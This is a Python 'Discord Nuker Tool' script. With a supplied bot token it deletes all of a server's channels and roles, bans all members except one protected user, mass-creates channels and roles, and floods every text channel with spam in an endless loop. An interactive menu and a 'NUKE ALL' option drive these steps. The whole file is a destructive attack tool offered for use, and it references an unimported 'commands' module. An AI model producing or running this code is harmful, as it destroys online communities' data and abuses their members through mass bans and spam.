import discord
import random
import asyncio
import os
from colorama import Fore, Style, init

init(autoreset=True)

# ========== ASCII Banner ==========
print("""\033[1;32m
███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
""")

# ========== User Inputs ==========
token = input("\033[1;34m Enter Your Token Bot:\033[1;30m ")
server_id = input("\033[1;34m Please Enter Server ID:\033[1;30m ")
protected_id = input("\033[1;34m Please Enter Your ID (Protected):\033[1;30m ")
delay = float(input("\033[1;34m Enter Delay (seconds) between actions (0.1):\033[1;30m ") or "0.1")

spam_message = input("\033[1;34m Enter Spam Message:\033[1;30m ")

print("\033[1;32m Discord Nuker Tool Starting...")

# ========== Bot Setup ==========
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# ========== Core Functions ==========

async def delete_channels(guild):
    print(Fore.YELLOW + "[*] Deleting all channels...")
    for c in guild.channels:
        try:
            await c.delete()
            print(Fore.GREEN + f"[+] Deleted Channel: {c.name}")
            await asyncio.sleep(delay)  # تأخير 0.1
        except Exception as e:
            print(Fore.RED + f"[-] Failed to delete {c.name}: {e}")

async def delete_roles(guild):
    print(Fore.YELLOW + "[*] Deleting all roles...")
    for r in guild.roles:
        if r.name != "@everyone":
            try:
                await r.delete()
                print(Fore.GREEN + f"[+] Deleted Role: {r.name}")
                await asyncio.sleep(delay)
            except Exception as e:
                print(Fore.RED + f"[-] Failed to delete {r.name}: {e}")

async def ban_members(guild):
    print(Fore.YELLOW + "[*] Banning all members...")
    for m in guild.members:
        if str(m.id) != str(protected_id):
            try:
                await m.ban(reason="Nuked by Nuker Bot")
                print(Fore.GREEN + f"[+] Banned: {m.name}")
                await asyncio.sleep(delay)
            except Exception as e:
                print(Fore.RED + f"[-] Failed to ban {m.name}: {e}")

async def create_channels(guild):
    channel_name = input("\033[1;34m Enter Channels Name:\033[1;30m ")
    num = int(input("\033[1;34m Enter Number of Channels:\033[1;30m "))
    print(Fore.YELLOW + f"[*] Creating {num} channels...")
    for i in range(num):
        try:
            await guild.create_text_channel(name=channel_name)
            print(Fore.GREEN + f"[+] Created Channel: {channel_name}")
            await asyncio.sleep(delay)
        except Exception as e:
            print(Fore.RED + f"[-] Error creating channel: {e}")

async def create_roles(guild):
    role_name = input("\033[1;34m Enter Roles Name:\033[1;30m ")
    num = int(input("\033[1;34m Enter Number of Roles:\033[1;30m "))
    print(Fore.YELLOW + f"[*] Creating {num} roles...")
    for i in range(num):
        try:
            await guild.create_role(name=role_name)
            print(Fore.GREEN + f"[+] Created Role: {role_name}")
            await asyncio.sleep(delay)
        except Exception as e:
            print(Fore.RED + f"[-] Error creating role: {e}")

async def spam_channels(guild):
    print(Fore.YELLOW + "[*] Spamming all channels...")
    while True:
        for c in guild.text_channels:
            try:
                await c.send(spam_message)
                print(Fore.GREEN + f"[+] Message sent to #{c.name}")
                await asyncio.sleep(delay)
            except:
                pass

async def nuke_all(guild):
    """هذا الخيار ينفذ كل شيء: حذف + حظر + إنشاء + سبام"""
    print(Fore.MAGENTA + "[!!] NUKE ALL ACTIVATED!")
    await delete_channels(guild)
    await delete_roles(guild)
    await ban_members(guild)
    channel_name = input("\033[1;34m Enter name for new channels:\033[1;30m ")
    num = int(input("\033[1;34m Enter number of channels to create:\033[1;30m "))
    for i in range(num):
        try:
            await guild.create_text_channel(name=channel_name)
            print(Fore.GREEN + f"[+] Created Channel: {channel_name}")
            await asyncio.sleep(delay)
        except:
            pass
    role_name = input("\033[1;34m Enter name for new roles:\033[1;30m ")
    num_roles = int(input("\033[1;34m Enter number of roles to create:\033[1;30m "))
    for i in range(num_roles):
        try:
            await guild.create_role(name=role_name)
            print(Fore.GREEN + f"[+] Created Role: {role_name}")
            await asyncio.sleep(delay)
        except:
            pass
    # تشغيل السبام في الخلفية
    bot.loop.create_task(spam_channels(guild))

# ========== Menu ==========
async def show_menu(guild):
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print("""\033[1;32m
███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
╠══════════════════════════════════════════════════╣
║ [1] Delete Channels                              ║
║ [2] Delete Roles                                 ║
║ [3] Ban All Members                              ║
║ [4] Create Channels                              ║
║ [5] Create Roles                                 ║
║ [6] Spam All Channels                            ║
║ [7] NUKE ALL (Delete + Ban + Create + Spam)      ║
║ [0] Exit                                         ║
╚══════════════════════════════════════════════════╝""")
        print(Fore.CYAN + f"Delay: {delay}s | Server: {guild.name}")
        choice = input("\033[1;34m Enter Your Choice:\033[1;30m ")

        if choice == "1":
            await delete_channels(guild)
        elif choice == "2":
            await delete_roles(guild)
        elif choice == "3":
            await ban_members(guild)
        elif choice == "4":
            await create_channels(guild)
        elif choice == "5":
            await create_roles(guild)
        elif choice == "6":
            bot.loop.create_task(spam_channels(guild))
            print(Fore.GREEN + "[+] Spam task started in background!")
        elif choice == "7":
            await nuke_all(guild)
        elif choice == "0":
            print(Fore.RED + "[-] Exiting...")
            await bot.close()
            break
        else:
            print(Fore.RED + "[-] Invalid choice!")
        input("\033[1;34m Press Enter to continue...\033[1;30m ")

# ========== On Ready ==========
@bot.event
async def on_ready():
    print(Fore.GREEN + f"[+] Logged in as {bot.user}")
    # البحث عن السيرفر بالـ ID
    guild = discord.utils.get(bot.guilds, id=int(server_id))
    if guild is None:
        print(Fore.RED + "[-] Server not found! Make sure the bot is in the server.")
        await bot.close()
        return
    print(Fore.GREEN + f"[+] Connected to Server: {guild.name} (ID: {server_id})")
    await show_menu(guild)

# ========== Run ==========
if __name__ == "__main__":
    bot.run(token)